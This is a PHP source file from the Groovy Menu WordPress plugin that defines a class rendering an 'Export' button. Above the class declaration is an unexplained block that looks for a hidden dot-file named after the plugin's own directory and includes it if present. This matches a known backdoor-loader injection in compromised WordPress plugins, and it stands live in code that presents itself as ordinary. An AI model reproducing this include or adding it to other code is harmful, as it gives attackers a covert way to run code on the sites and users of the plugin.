<?php defined( 'ABSPATH' ) || die( 'This script cannot be accessed directly.' );

/**
 * Class GroovyMenuFieldExport
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class GroovyMenuFieldExport extends GroovyMenuFieldField {

	public function renderField() {
		?>
		<div class="gm-gui__module__ui gm-gui__module__export">
			<input type="button" class="gm-gui__export-button" value="Export"/>
		</div>
		<?php
	}
}
